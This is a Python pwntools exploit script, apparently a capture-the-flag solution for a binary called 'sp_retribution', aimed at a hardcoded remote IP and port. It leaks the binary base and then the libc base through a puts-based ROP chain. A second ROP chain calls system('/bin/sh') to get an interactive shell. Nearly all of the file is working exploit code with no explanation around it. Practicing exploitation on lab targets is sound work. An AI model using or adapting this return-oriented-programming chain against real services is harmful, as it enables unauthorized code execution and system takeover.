#!/usr/bin/env python3

from pwn import *

exe = ELF("sp_retribution_patched", checksec=False)
libc = ELF("./glibc/libc.so.6", checksec=False)
ld = ELF("./glibc/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
# context.log_level 	= "WARNING"
context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

gs = '''
brva 0xAC5
disable
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)
  
def change_location():
    io.sendlineafter(b">> ", b"2")
    
def leak_binary():
	io.recvuntil(b"Insert new coordinates: x = [0x53e5854620fb399f], y = ")
	io.sendline()
	io.recv(numb=0x34)
	stuff = io.recv(numb=0x6)
	leak = stuff.ljust(8, b"\x00")
	leak = u64(leak) - 0x0d0a
	exe.address = leak
	print(f"Binary base = {hex(exe.address)}")
 
def leak_libc(payload:bytes):
	io.sendline(payload)
	result = io.recvuntil(b">> ")
	results = result.split(b"\n")
	leak = results[3].ljust(8, b"\x00")
	libc_leak = u64(leak) - libc.sym['puts']
	libc.address = libc_leak
	print(f"Libc base = {hex(libc.address)}")

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
# ip_offset = 56
# io = start_local(isDebug)

######## REMOTE ########
remote_address = "94.237.122.36:56952"
io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
io.timeout = 1

change_location()
leak_binary()

rop = ROP(exe)
payload = flat(
	b"a" * 88,
	p64(rop.find_gadget(['pop rdi', 'ret'])[0]),
	p64(exe.got.puts),
 	p64(exe.plt.puts),
	p64(exe.sym['main'])
)

leak_libc(payload)

change_location()
io.sendline()
input("Press Enter to continue...")
payload = flat(
	b"a" * 88,
	p64(rop.find_gadget(['pop rdi', 'ret'])[0]),
	p64(next(libc.search(b"/bin/sh"))),
 	p64(libc.sym.system),
)

io.sendline(payload)

io.interactive()
